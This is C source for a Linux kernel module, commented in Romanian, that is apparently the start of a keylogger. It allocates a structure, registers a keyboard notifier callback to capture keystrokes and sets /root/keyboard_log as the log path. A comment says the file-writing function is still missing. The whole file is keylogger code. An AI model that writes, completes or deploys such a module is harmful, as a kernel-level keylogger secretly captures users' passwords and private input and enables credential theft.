#include "struct_keylogger.h"
#include "keyboard_callback.h"

#define LOG_FILE_PATH       "/root/keyboard_log"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Autorul Tău");
MODULE_DESCRIPTION("Un simplu modul pentru logarea tastelor");

static struct KEYLOGGER *keylogger;

static int __init keyboard_logger_init(void) 
{
    keylogger=kzalloc(sizeof(KEYLOGGER),GFP_KERNEL);
    if(keylogger==NULL)
    {
        pr_err("Nu se poate aloca memorie\n");
        return -ENOMEM;
    }

    keylogger->key_notifier.notifier_call=keyboard_callback;
    //IMI TREBUIE FUNCTIA DE WRITE IN FISIERUL DE LOG PENTRU CA SA POT SA DAU INIT LA PROGRAM

    register_keyboard_notifier(&keylogger->key_notifier);


    return 0;
}

static void __exit keyboard_logger_exit(void) 
{
    unregister_keyboard_notifier(&keylogger->key_notifier);
    kfree(keylogger);
}

module_init(keyboard_logger_init);
module_exit(keyboard_logger_exit);